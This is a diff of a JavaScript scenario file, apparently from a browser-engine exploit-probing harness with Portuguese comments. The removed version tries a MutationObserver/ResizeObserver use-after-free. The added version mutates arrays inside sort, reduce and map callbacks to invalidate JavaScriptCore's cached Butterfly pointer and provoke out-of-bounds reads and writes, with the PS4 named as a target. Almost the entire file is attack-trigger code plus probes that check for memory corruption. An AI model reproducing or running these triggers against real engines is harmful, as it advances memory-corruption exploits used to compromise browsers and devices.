@@ -1,144 +1,116 @@
 /**
- * SC_NATIVE_CALLBACK_UAF.JS
- * Categoria : DOM — Use-After-Free (Native Callback)
- * Alvo      : WebCore::MutationObserver / ResizeObserver C++ bindings
- * Técnica   : Registra MutationObserver e ResizeObserver em elementos,
- *             remove os elementos e desconecta os observers, forçando
- *             o motor a disparar callbacks pendentes sobre nós liberados.
- *             Microtask queue pode conter referências stale ao C++ node.
- * Referência: WebKit MutationObserver deliver-mutations-after-free pattern
+ * CENÁRIO: NATIVE_CALLBACK_MUTATION_UAF
+ * Superfície C++: ArrayPrototype.cpp (sort) / JSArray.cpp (Butterfly)
+ * Risco: HIGH
+ *
+ * Diferença para a versão genérica:
+ *   - Versão anterior só testava Array.sort() e não capturava o estado
+ *     do Butterfly C++ de forma adequada.
+ *   - Versão robusta testa 3 funções nativas que executam callbacks JS
+ *     durante iteração sobre o array no C++:
+ *     (A) Array.prototype.sort   — muta o array durante comparação
+ *     (B) Array.prototype.reduce — muta durante acumulação
+ *     (C) Array.prototype.map    — substitui array por TypedArray durante mapeamento
+ *   - Cada variante tenta encolher/crescer o array de forma diferente
+ *     para invalidar o ponteiro de Butterfly cacheado pelo C++.
+ *   - A variante (C) é especialmente interessante no PS4 (sem JIT):
+ *     map() em array Holey cria um "hole" que o C++ preenche com JSValue
+ *     undefined — se o Butterfly foi realocado, essa escrita vai OOB.
  */
 
 export default {
-    id:          'NATIVE_CALLBACK_UAF',
-    category:    'DOM',
-    risk:        'HIGH',
-    description: 'MutationObserver/ResizeObserver disparam callbacks '
-                + 'sobre nós já removidos do DOM antes do disconnect().',
+    id:       'NATIVE_CALLBACK_MUTATION_UAF',
+    category: 'CoreJS',
+    risk:     'HIGH',
+    description:
+        'Funções nativas C++ (sort, reduce, map) com callback JS que muta o array. ' +
+        'Atacam o ponteiro de Butterfly cacheado pelo C++ durante iteração. ' +
+        'Variante map() em array Holey testa OOB write quando Butterfly é realocado.',
 
-    /* ── estado interno ──────────────────────────────────────────────── */
-    _container:     null,
-    _target:        null,
-    _mutObs:        null,
-    _resObs:        null,
-    _mutRecords:    [],
-    _resEntries:    [],
-    _mutCount:      0,
-    _resCount:      0,
-
-    supported: function() {
-        return typeof MutationObserver !== 'undefined';
+    setup: function() {
+        this.log = [];
+        this.attacked = { sort: false, reduce: false, map: false };
     },
 
-    /* ── setup ──────────────────────────────────────────────────────── */
-    setup: async function() {
-        this._mutRecords = [];
-        this._resEntries = [];
-        this._mutCount   = 0;
-        this._resCount   = 0;
+    trigger: function() {
 
-        this._container = document.createElement('div');
-        this._container.style.cssText = 'width:100px;height:100px;position:absolute;left:-9999px';
-        document.body.appendChild(this._container);
-
-        this._target = document.createElement('div');
-        this._target.style.cssText = 'width:50px;height:50px;background:red';
-        this._target.textContent = 'mutation-target';
-        this._container.appendChild(this._target);
-
-        // MutationObserver
-        this._mutObs = new MutationObserver((records) => {
-            this._mutCount += records.length;
-            this._mutRecords.push(...records.map(r => ({
-                type:    r.type,
-                target:  r.target?.nodeName ?? 'null',
-                added:   r.addedNodes?.length,
-                removed: r.removedNodes?.length,
-            })));
-        });
-        this._mutObs.observe(this._target, {
-            childList: true, subtree: true,
-            attributes: true, characterData: true
-        });
-
-        // ResizeObserver (se disponível)
-        if (typeof ResizeObserver !== 'undefined') {
-            this._resObs = new ResizeObserver((entries) => {
-                this._resCount += entries.length;
-                this._resEntries.push(...entries.map(e => ({
-                    w: e.contentRect?.width,
-                    h: e.contentRect?.height,
-                })));
+        // ── VARIANTE A: sort mutation ──────────────────────────────────────
+        this.sortArr = Array.from({ length: 60 }, (_, i) => 60.0 - i); // doubles
+        try {
+            this.sortArr.sort((a, b) => {
+                if (!this.attacked.sort) {
+                    this.attacked.sort = true;
+                    // Encurta o array para 0 durante a ordenação
+                    this.sortArr.length = 0;
+                    // Pressão de memória para forçar GC e realocar Butterfly
+                    const trash = [];
+                    for (let i = 0; i < 15; i++) trash.push(new ArrayBuffer(512 * 1024));
+                }
+                return a - b;
             });
-            this._resObs.observe(this._target);
-        }
+        } catch(e) { this.log.push({ phase: 'sort', err: e.constructor.name }); }
 
-        // Provoca mutações para popular a queue
-        this._target.appendChild(document.createTextNode('a'));
-        this._target.setAttribute('data-uaf', '1');
-        void this._target.offsetWidth;
-        await new Promise(r => setTimeout(r, 10));
+        // ── VARIANTE B: reduce mutation ────────────────────────────────────
+        this.reduceArr = Array.from({ length: 40 }, (_, i) => i * 1.1);
+        try {
+            this.reduceArr.reduce((acc, val, idx) => {
+                if (!this.attacked.reduce && idx === 10) {
+                    this.attacked.reduce = true;
+                    // Expande o array durante a iteração (força realocação do Butterfly)
+                    for (let i = 0; i < 1000; i++) this.reduceArr.push(i * 2.2);
+                }
+                return acc + val;
+            }, 0);
+        } catch(e) { this.log.push({ phase: 'reduce', err: e.constructor.name }); }
+
+        // ── VARIANTE C: map com array Holey ───────────────────────────────
+        this.mapArr = [1.1, 2.2, 3.3];
+        this.mapArr[200] = 4.4; // Cria hole gigante — o C++ preenche com undefined JSValue
+        try {
+            this.mapResult = this.mapArr.map((val, idx) => {
+                if (!this.attacked.map && idx === 1) {
+                    this.attacked.map = true;
+                    // Substitui o backing store: de array Holey para array compacto
+                    this.mapArr.length = 0;
+                    this.mapArr.push(...Array(5).fill(99.9));
+                }
+                return val * 2;
+            });
+        } catch(e) { this.log.push({ phase: 'map', err: e.constructor.name }); }
     },
 
-    /* ── trigger ─────────────────────────────────────────────────────── */
-    trigger: async function() {
-        // Fila mais mutações ANTES de remover (ficam pendentes na microtask queue)
-        this._target.setAttribute('data-uaf', '2');
-        this._target.appendChild(document.createElement('span'));
-
-        // Remove imediatamente — C++ node pode ser libertado antes dos callbacks
-        this._target.remove();
-        void document.body.offsetWidth;
-
-        // Altera atributos no nó já removido para forçar callbacks
-        try { this._target.setAttribute('data-uaf', '3'); } catch(_) {}
-        try { this._target.style.width = '99px';          } catch(_) {}
-
-        // Agora desconecta — callbacks pendentes podem disparar pós-free
-        try { this._mutObs.disconnect(); } catch(_) {}
-        try { this._resObs?.disconnect(); } catch(_) {}
-
-        // Força entrega das mutações pendentes
-        try { this._mutObs.takeRecords(); } catch(_) {}
-
-        await new Promise(r => setTimeout(r, 20));
-    },
-
-    /* ── probes ──────────────────────────────────────────────────────── */
     probe: [
-        // [0-3] estado do nó removido
-        s => s._target.isConnected,
-        s => s._target.nodeType,
-        s => s._target.nodeName,
-        s => s._target.getAttribute('data-uaf'),
+        // VARIANTE A: sort
+        s => s.sortArr.length,        // Deve ser 0. Se C++ forçou outro valor = corrupção
+        s => s.sortArr[0],            // Undefined esperado. Qualquer valor = OOB read
+        s => s.sortArr[59],
+        s => typeof s.sortArr[0],
 
-        // [4-7] callbacks do MutationObserver
-        s => s._mutCount,
-        s => s._mutRecords.length,
-        s => s._mutRecords[0]?.type ?? 'null',
-        s => s._mutRecords.find(r => r.target === 'null') ? 'ghost-target' : 'clean',
+        // VARIANTE B: reduce
+        s => s.reduceArr.length,      // 1040 após expansão. Outro valor = Butterfly corrompido
+        s => s.reduceArr[0],
+        s => s.reduceArr[39],         // Limite original — se diferente do normal, stale read
+        s => s.reduceArr[1039],       // Cauda adicionada durante iteração
 
-        // [8-10] callbacks do ResizeObserver
-        s => s._resCount,
-        s => s._resEntries[0]?.w ?? 'null',
-        s => s._resEntries.some(e => e.w === 0 && e.h === 0) ? 'zero-entry' : 'ok',
+        // VARIANTE C: map
+        s => s.mapArr.length,         // 5 após reset. Outro valor = corrupção
+        s => s.mapArr[0],
+        s => s.mapResult?.length,     // Comprimento do resultado do map
+        s => s.mapResult?.[0],        // 2.2 esperado (1.1 * 2)
+        s => s.mapResult?.[200],      // Hole processado pelo C++ com Butterfly corrompido?
 
-        // [11] records pendentes após disconnect
-        s => { try { return s._mutObs.takeRecords().length; } catch(e) { return -1; } },
+        // Erros registrados
+        s => s.log.length,
+        s => s.log.map(e => e.phase + ':' + e.err).join(',') || 'none',
+
+        // Estado dos flags de ataque
+        s => Object.values(s.attacked).filter(Boolean).length, // Quantos ataques dispararam
     ],
 
-    /* ── cleanup ─────────────────────────────────────────────────────── */
-    cleanup: async function() {
-        try { this._mutObs?.disconnect(); } catch(_) {}
-        try { this._resObs?.disconnect(); } catch(_) {}
-        this._container?.remove();
-        this._container  = null;
-        this._target     = null;
-        this._mutObs     = null;
-        this._resObs     = null;
-        this._mutRecords = [];
-        this._resEntries = [];
-        this._mutCount   = 0;
-        this._resCount   = 0;
+    cleanup: function() {
+        this.sortArr   = null;
+        this.reduceArr = null;
+        this.mapArr    = null;
+        this.mapResult = null;
     }
 };
